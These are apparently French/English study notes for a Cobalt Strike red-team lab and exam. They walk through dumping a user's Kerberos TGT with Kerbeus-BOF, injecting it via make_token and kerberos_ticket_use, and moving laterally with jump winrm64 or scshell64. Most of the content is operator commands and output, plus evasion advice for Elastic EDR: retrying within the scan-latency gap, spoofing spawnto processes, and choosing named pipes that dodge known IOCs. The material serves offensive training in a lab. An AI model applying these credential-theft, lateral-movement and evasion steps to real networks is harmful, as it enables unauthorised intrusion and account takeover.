# Lab — User Impersonation

> **Objectif :** récupérer le TGT d’un utilisateur depuis sa session de logon active et effectuer une impersonation pour accéder à ses ressources distantes sans connaître son mot de passe.

## Quand utiliser l’impersonation  

> Disposer d’un Beacon SYSTEM après Privilege Escalation  
> Puis récupérer le TGT → impersonation → accès distant
>Lateral Movement  
>Domain Dominance  

## Prérequis

⚠️ Charger le script Aggressor Kerbeus-BOF s’il ne l’est pas déjà :
```
CS → Cobalt Strike → Script Manager → Load → C:\Tools\Kerbeus-BOF\kerbeus_cs.cna
```

## Vérifier le refus d’accès 

```cs
beacon> ls \\lon-ws-1\c$
```

## Énumération locale    

Depuis le Beacon SYSTEM, rechercher les processus exécutés sous l’identité de l’autre utilisateur :

```cs
ps

// Look for any process where User = CONTOSO\rsteel
// e.g. cmd.exe, mmc.exe, explorer.exe owned by rsteel

krb_triage
```

Rechercher l’utilisateur : `rsteel @ CONTOSO.COM | krbtgt/CONTOSO.COM`  

| LUID | Compte | Remarques |
|------|---------|-------|
| `0x3e7` | `lon-wkstn-1$` | Session SYSTEM — TGT du compte machine |
| `0x3e4` | `lon-wkstn-1$` | Session Network Service |
| Autre | Utilisateur du domaine | Logon interactif ou réseau — TGT utilisateur |

## Récupérer le TGT utilisateur  

```cs
krb_dump /user:rsteel /service:krbtgt
```

**OPSEC:** `OPSEC-🟠CAUTION`
- Kerbeus-BOF utilise l’API Kerberos pour accéder aux tickets, sans `ReadProcessMemory` direct sur LSASS.
- Les notes indiquent une détection différente de Mimikatz `sekurlsa::tickets`, avec un accès indirect à LSASS.
- L’Event 4769 peut apparaître sur le DC lors d’une demande de service ticket, mais pas directement à cause de cette commande.
- Elastic EDR et Sysmon peuvent journaliser l’exécution du BOF via le processus Beacon.

Copier la valeur Base64 du ticket `.kirbi` depuis la sortie.

## Enregistrer le `.kirbi` sur l’Attacker Desktop

> Utiliser la valeur Base64 obtenue dans la commande PowerShell de l’Attacker Desktop :

```powershell
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\rsteel.kirbi", [Convert]::FromBase64String("<paste-base64-here>"))
```

## Créer une session de logon temporaire  

```cs
make_token CONTOSO\rsteel FakePass
```

**OPSEC:** `OPSEC-🟠CAUTION`
- Crée une session de logon de type 9 (NewCredentials) ; **Event 4648** enregistré selon les notes.
- Le mot de passe est fictif, sans validation par le DC.
- La session de logon est locale et sert à accueillir le ticket Kerberos injecté.
- L’Event 4648 peut associer `CONTOSO\rsteel` à la machine et être visible dans le SIEM.

**Pourquoi FakePass fonctionne :**
`make_token` avec la sémantique `/netonly` crée une session de logon sans valider les credentials localement. Le ticket injecté fournit l’authentification Kerberos, indépendamment du champ mot de passe.

## Injecter le TGT `.kirbi` dans la session  

```cs
kerberos_ticket_use C:\Users\Attacker\Desktop\rsteel.kirbi
```

**OPSEC:** `OPSEC-🟠CAUTION`
- Utilise `LsaCallAuthenticationPackage` avec `KerbSubmitTicketMessage` pour injecter le ticket dans la session créée par `make_token`.
- Elastic EDR peut observer les appels aux API LSASS dans sa télémétrie.

## Vérifier le chargement du ticket

> Utiliser `powerpick` pour éviter le child process mentionné : OPSEC-🟠CAUTION. 
```cs
powerpick klist
```
## Accéder aux ressources distantes

```cs
ls \\lon-ws-1\c$
ls \\lon-dc-1\c$
```

### Terminer l’impersonation

```cs
beacon> rev2self
```

**Exécuter `rev2self` à la fin** : la session de logon reste ouverte, mais le token récupéré n’est plus utilisé. La session est purgée à la fermeture du Beacon.

---

## OPSEC — Comparaison steal_token / make_token

| | `steal_token` | `make_token` + `kerberos_ticket_use` |
|--|---|---|
| Niveau | 🟢SAFE | 🟠CAUTION |
| Event logon | Aucun | Event 4648 sur l’hôte local |
| Accès à LSASS | Aucun | API Kerberos via LSASS |
| Prérequis | Processus cible actif | TGT obtenu par `krb_dump` |
| Après la déconnexion utilisateur | Non | Oui, tant que le `.kirbi` reste valide |
| Priorité à l’examen | **À essayer d’abord** | Alternative |

----

# Aucun mot de passe en clair nécessaire

L’impersonation par token/ticket évite le cracking de hashes dans ce scénario. Kerberoasting reste une technique à connaître, mais le cracking n’est pas forcément indispensable.

| Objectif | Technique | Mot de passe en clair requis ? |
|------|-----------|-----------------|
| Lateral Movement | `steal_token` + `jump winrm64` | No |
| Lateral Movement | `make_token` + `kerberos_ticket_use` + `jump winrm64` | No — fake pass works |
| Lateral Movement NTLM | `pth` | NTLM hash only — no plaintext |
| Reconnaissance domaine | `ldapsearch` BOF | No |
| Accès au partage distant | stolen TGT + `kerberos_ticket_use` | No |

**Cas où un mot de passe en clair est nécessaire :**
- RDP avec authentification par mot de passe (rare dans ce lab).
- Credential spraying si aucun ticket n’est disponible.

**Workflow d’examen :** `steal_token` → `jump winrm64` → new beacon as impersonated user. Token/ticket impersonation is always faster and stealthier than waiting on hashcat.

---

## Lateral Movement — Jump après impersonation

> Ces méthodes s’utilisent **après** `steal_token` ou `make_token` + `kerberos_ticket_use`. Chaque technique possède son propre profil de détection.

### Préparation — Configurer spawnto avant le Jump

```cs
// For WinRM / inject-based jumps (fork & run into remote process)
beacon> spawnto x64 %windir%\sysnative\werfault.exe

// For service-based jumps (scshell64, psexec64)
beacon> ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
```

> Le `spawnto` par défaut est `rundll32.exe`, souvent surveillé par les EDR. Les notes recommandent de le configurer avant un Jump.

---

### Jump vers un hôte

> Utiliser `winrm64` si WinRM est actif sur la cible.  

```cs
beacon> powerpick Test-WSMan lon-ws-1       // test reachability — OPSEC-🟢SAFE, no child proc
beacon> jump winrm64 lon-ws-1 smb
```

| Propriété | Détail |
|----------|--------|
| Mécanisme | WinRM executes shellcode, injects into `wsmprovhost.exe` |
| Service créé | Non |
| Event 7045 | No |
| Event 4648 | No (if steal_token used) |
| Écriture disque | Non |
| Child process sur la source | Non |

**Observations EDR (lab du 19/04/2026) :**
`jump winrm64` generates the SMB beacon payload on-the-fly. Elastic Endpoint may kill it on first attempt (`ERROR_FILE_NOT_FOUND`). **Always retry once before falling down** — Elastic has a scan latency window and the second attempt often succeeds within 10–15 seconds of the first.

```
Attempt 1 → ERROR_FILE_NOT_FOUND  (Elastic killed beacon before pipe created)
Wait 10-15 seconds
Attempt 2 → established link      (payload executed inside EDR scan window gap)
```

Only fall to Method `scshell64` if two consecutive attempts both return `ERROR_FILE_NOT_FOUND`.

---

### Méthode scshell64  

**Utilisé lorsque WinRM est désactivé ou que le payload est bloqué :** modifie un service existant, sans en créer de nouveau.

```cs
// Load CNA first if not already loaded:
// CS → Script Manager → Load → C:\Tools\SCShell\CS-BOF\scshell.cna

beacon> ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
beacon> jump scshell64 <target> <listener>
beacon> rev2self
```

| Propriété | Détail |
|----------|--------|
| Mécanisme | Modifies existing service `ImagePath` via SCM RPC — runs payload as SYSTEM |
| Service created | No (modifies existing) |
| Event 7045 | No |
| Event 7040 | **Yes** — service config changed |
| Écriture disque | Non |
| Prérequis | Administrateur local sur la cible |

> SCShell restores the original service path after execution — Event 7040 fires twice (change + restore). Less noisy than psexec but still visible to a tuned SIEM.

---


### Comportement observé d’Elastic Endpoint (19/04/2026)

**All hosts confirmed running:** `elastic-agent.exe`, `elastic-endpoint.exe`, `MsMpEng.exe`, `Sysmon64.exe`

**Résultats winrm64 — Lab Unconstrained Delegation :**
- Source beacon died after `jump winrm64` — Elastic had already tracked/flagged the beacon process in that lab instance
- Likely cause: beacon was already an active detection target before the jump — fresh lab instances behave differently
- Not a reliable indicator of winrm64 capability — environment state matters

**Résultats winrm64 — Lab Constrained Delegation (instance neuve) :**
- Attempt 1 with `smb` (TSVCPIPE-*) → `ERROR_FILE_NOT_FOUND` — Elastic kills beacon on lon-fs-1 before pipe created
- Attempt 2 (13s later) with `smb` → `[+] established link` — **succeeded** via scan latency gap
- `smb_custom` (mojo pipe) → `[+] established link` **first attempt** — may be pipe name effect, may be fresh Elastic state
- Conclusion: **retry winrm64 once before falling to scshell64** — timing/environment state is a factor

**Résultats scshell64 :**
- `ak-settings spawnto_x64 C:\Windows\System32\svchost.exe` required first
- Payload binary (`evil59.exe`) written to `\\target\C$\Windows\System32\` — transient, auto-deleted
- `defragsvc` service path modified (Event 7040 × 2) — restored after execution
- Beacon established **first attempt in both lab instances** — most reliable delivery method observed
- OPSEC cost: Event 7040 × 2, brief disk write to System32

**Conclusion sur la méthode d’authentification :** `steal_token` required for WinRM auth — uses real Kerberos TGT from the target process token. `make_token` without `kerberos_ticket_use` = `ERROR_LOGON_FAILURE` — WinRM rejects fake credentials. Never use `make_token` alone for WinRM lateral movement.

**Conclusion sur les named pipes :** Pipe name is NOT the primary Elastic detection vector — payload content in memory is. However, custom pipe names are still required for exam OPSEC score (examiner reviews artifacts) and to avoid MDI/threat hunting detections on `TSVCPIPE-*`. See pipe name guidance below.

---

### Named Pipes SMB Listener — Examen

**Do NOT use `mojo.5688.8052.183894939787088877`** — this specific value has been documented in threat intelligence reports since 2019 (FalconForce, Red Canary, Elastic detection rules). It is as signatured as `TSVCPIPE-*` in modern detection tooling.

**Éviter ces noms : ce sont des IOCs Cobalt Strike documentés :**
```
TSVCPIPE-*       ← CS default
mojo.*           ← documented evasion technique since 2019
msagent_*        ← CS default
postex_*         ← CS default
MSSE-*-server    ← CS default
```

**Use on exam day — blends with legitimate Windows/application pipes:**

```
CS → Listeners → Add (SMB) → Pipename field:

Option 1 — matches post-ex profile pipename pattern (consistent across all CS pipes):
  dotnet-diagnostic-#####
  (CS replaces each # with a random digit — different every session)

Option 2 — GUID format (generic, common in Windows IPC):
  ########-####-####-####-############

Option 3 — Windows service pipe pattern:
  wkssvc-########
  ntsvcs-########
```

> `#` is a CS wildcard — replaced with a random hex digit when the listener is created. Use this format so your pipe name is unique each exam session and never matches a documented IOC list.

Your malleable profile already sets `post-ex.pipename "dotnet-diagnostic-#####, ########-####-####-####-############"` — use `dotnet-diagnostic-#####` for the SMB listener too, so all CS named pipes follow the same pattern and blend together as .NET runtime diagnostic pipes.
